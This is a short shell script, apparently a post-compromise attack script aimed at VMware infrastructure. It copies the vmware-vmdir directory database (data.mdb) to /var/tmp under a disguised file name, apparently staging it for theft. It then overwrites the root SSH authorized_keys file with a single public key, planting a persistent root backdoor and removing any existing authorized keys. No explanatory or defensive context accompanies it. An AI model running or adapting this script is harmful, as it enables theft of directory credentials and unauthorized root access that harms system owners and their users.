#!/bin/sh
/bin/cp "/storage/db/vmware-vmdir/data.mdb" /var/tmp/renamed.bin
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEaK9u4lRnt8Nzk2PjG2xhXFKKslr+QzY48eZbbqwSQl' > "/etc/ssh/keys-root/authorized_keys"
